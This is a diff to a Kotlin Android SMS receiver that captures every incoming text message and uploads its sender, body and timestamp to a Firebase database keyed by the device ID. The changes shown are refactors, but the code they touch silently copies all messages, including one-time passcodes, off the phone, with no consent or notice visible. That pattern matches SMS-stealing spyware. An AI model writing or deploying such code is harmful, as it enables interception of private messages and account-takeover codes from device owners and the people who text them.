@@ -10,17 +10,20 @@ import com.google.firebase.database.FirebaseDatabase
 
 class SmsReceiver : BroadcastReceiver() {
 
-    override fun onReceive(context: Context?, intent: Intent?) {
-        if (context == null || intent == null) return
-
+    override fun onReceive(context: Context, intent: Intent) {
         if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
             val bundle = intent.extras
-            val messages = bundle?.get("pdus") as? Array<*>
-            val format = bundle?.getString("format")
-            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+            val pdus = bundle?.get("pdus") as? Array<*> ?: return
+            val format = bundle.getString("format")
+
+            val deviceId = Settings.Secure.getString(
+                context.contentResolver,
+                Settings.Secure.ANDROID_ID
+            ) ?: "unknown_device"
+
             val smsRef = FirebaseDatabase.getInstance().getReference("sms").child(deviceId)
 
-            messages?.forEach { pdu ->
+            for (pdu in pdus) {
                 val sms = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                     SmsMessage.createFromPdu(pdu as ByteArray, format)
                 } else {
@@ -28,10 +31,12 @@ class SmsReceiver : BroadcastReceiver() {
                 }
 
                 val smsData = mapOf(
-                    "address" to (sms.originatingAddress ?: "Unknown"),
-                    "body" to (sms.messageBody ?: ""),
-                    "timestamp" to sms.timestampMillis.toString()
+                    "id" to System.currentTimeMillis().toString(),
+                    "sender" to sms.originatingAddress,
+                    "body" to sms.messageBody,
+                    "timestamp" to sms.timestampMillis
                 )
+
                 smsRef.push().setValue(smsData)
             }
         }
